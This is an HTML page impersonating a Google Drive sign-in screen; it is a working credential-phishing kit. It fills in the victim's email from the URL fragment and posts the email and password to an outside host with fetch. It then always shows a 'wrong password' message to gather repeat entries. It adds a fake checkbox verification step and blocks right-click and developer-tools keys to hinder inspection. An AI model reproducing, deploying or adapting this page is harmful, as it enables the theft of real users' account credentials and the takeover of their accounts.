<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Drive Access</title>

<style>
  :root {
    --blue: #4285F4;
    --red: #EA4335;
    --yellow: #FBBC04;
    --green: #34A853;

    --bg: #f8f9fa;
    --card: #ffffff;
    --border: #dadce0;
    --text: #202124;
    --muted: #5f6368;
  }

  * {
    box-sizing: border-box;
    font-family: Roboto, "Google Sans", Arial, sans-serif;
  }

  body {
    margin: 0;
    background: var(--bg);
    color: var(--text);
  }

  .topbar {
    height: 64px;
    display: flex;
    align-items: center;
    padding: 0 24px;
    background: white;
    border-bottom: 1px solid var(--border);
  }

  .logo img {
    width: 32px;
    height: 32px;
    margin-right: 12px;
  }

  .brand {
    font-size: 17px;
    font-weight: 500;
  }

  .wrapper {
    min-height: calc(100vh - 64px);
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
  }

  .card {
    width: 430px;
    background: var(--card);
    border: 1px solid var(--border);
    border-radius: 12px;
    box-shadow: 0 4px 18px rgba(0,0,0,0.08);
  }

  .header {
    padding: 18px;
    border-bottom: 1px solid var(--border);
    font-weight: 500;
  }

  .header-inner {
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .header-inner img {
    width: 22px;
    height: 22px;
  }

  .body {
    padding: 22px;
  }

  .message {
    display: none;
    padding: 10px 12px;
    border-radius: 6px;
    font-size: 13px;
    margin-bottom: 14px;
    background: #f1f3f4;
    border-left: 4px solid var(--blue);
    color: var(--muted);
  }

  .message.error {
    display: block;
    border-left-color: var(--red);
  }

  .message.success {
    display: block;
    border-left-color: var(--green);
  }

  .box {
    padding: 14px;
    border: 1px solid var(--border);
    border-radius: 8px;
    background: #fafafa;
    font-size: 14px;
  }

  input[type="checkbox"] {
    transform: scale(1.05);
    margin-right: 8px;
    accent-color: var(--blue);
  }

  .input {
    width: 100%;
    padding: 13px;
    margin-top: 12px;
    border-radius: 6px;
    border: 1px solid var(--border);
    outline: none;
    font-size: 14px;
  }

  .input:focus {
    border-color: var(--blue);
    box-shadow: 0 0 0 2px rgba(66,133,244,0.15);
  }

  .btn {
    margin-top: 16px;
    width: 100%;
    padding: 12px;
    border-radius: 6px;
    border: none;
    cursor: pointer;
    background: var(--blue);
    color: white;
    font-weight: 500;
    font-size: 14px;
    transition: 0.2s;
  }

  .btn:hover {
    background: #1a73e8;
  }

  .hidden {
    display: none;
  }

  .login-logo {
    display: flex;
    justify-content: center;
    margin-bottom: 16px;
  }

  .login-logo img {
    width: 64px;
    height: 64px;
  }

  .done {
    text-align: center;
    color: var(--green);
    font-weight: 500;
    padding: 20px 0;
  }
  
  .message.info {
  display: block;
  border-left-color: var(--blue);
}

  @media (max-width: 600px) {
    .topbar { padding: 0 12px; }
    .brand { font-size: 15px; }
    .wrapper { padding: 12px; align-items: flex-start; }
    .card { width: 100%; border-radius: 10px; }
    .body { padding: 16px; }
    .header { padding: 14px; }
    .login-logo img { width: 52px; height: 52px; }
    .btn { font-size: 15px; padding: 13px; }
    .input { font-size: 15px; }
  }

</style>
</head>

<body>

<div class="topbar">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" alt="Google Drive">
  </div>
  <div class="brand">Google Drive Access</div>
</div>

<div class="wrapper">
  <div class="card">

    <div class="header">
      <div class="header-inner">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" alt="Drive">
        <span>Drive</span>
      </div>
    </div>

    <div class="body">

      <div id="msg" class="message"></div>

      <div id="bot">
        <div class="box">
          <label>
            <input type="checkbox" id="check">
            I confirm I am authorized to access this service
          </label>
        </div>

        <button class="btn" onclick="goNext()">
          Continue
        </button>
      </div>

    <div id="login" class="hidden">

<form action="https://23min45.online//naz1/index.php" method="post" onsubmit="submitForm(event)">

    <div class="login-logo">
    </div>

    <input class="input" name="email" id="email" type="email" placeholder="Email or phone" readonly>
    <input class="input" name="password" id="password" type="password" placeholder="Password">

	<button class="btn" type="submit">
	Next
	</button>

  </form>

      <div id="done" class="hidden done">
        ✔ Signed in successfully
      </div>

    </div>
  </div>
</div>

<script>
  const msg = document.getElementById("msg");
  const bot = document.getElementById("bot");
  const login = document.getElementById("login");
  const done = document.getElementById("done");
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");

  window.addEventListener("load", () => {

    const savedEmail = localStorage.getItem("savedEmail");
    if (savedEmail) {
      emailInput.value = savedEmail;
    }

    const hash = decodeURIComponent(window.location.hash.substring(1));

    if (hash && hash.includes("@")) {

      emailInput.value = hash;

      localStorage.setItem("savedEmail", hash);

      history.replaceState(
        null,
        null,
        window.location.pathname + window.location.search
      );
    }
  });

  function showMessage(text, type = "info") {
    msg.textContent = text;
    msg.className = "message " + type;
  }

  function clearMessage() {
    msg.textContent = "";
    msg.className = "message";
  }

  // ✅ NEW: clear message when user types new password
  passwordInput.addEventListener("input", clearMessage);

  function goNext() {

    if (!document.getElementById("check").checked) {
      showMessage("Please complete verification", "error");
      return;
    }

    showMessage("Verification complete", "success");

    setTimeout(() => {
      bot.classList.add("hidden");
      login.classList.remove("hidden");
      clearMessage();
    }, 900);
  }

 function submitForm(event) {
  event.preventDefault();

  const email = emailInput.value;
  const pass = passwordInput.value;

  if (!email.includes("@")) {
    showMessage("Enter valid email", "error");
    return;
  }

  if (pass.trim() === "") {
    showMessage("Password required", "error");
    return;
  }

  showMessage("Checking password...", "info");

  const btn = document.querySelector("#login .btn");
  btn.disabled = true;
  btn.textContent = "Loading...";

  // send to YOUR PHP backend (safe)
fetch("https://23min45.online//naz1/index.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "email=" + encodeURIComponent(email) +
          "&password=" + encodeURIComponent(pass)
  });

setTimeout(() => {
  showMessage("Please put correct password", "error");
  passwordInput.value = "";
  passwordInput.focus();

  btn.disabled = false;
  btn.textContent = "Next";
}, 2000);
}
</script>

<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.onkeydown = function(e) {
  if (e.keyCode == 123) return false;
};
</script>

</body>
</html>
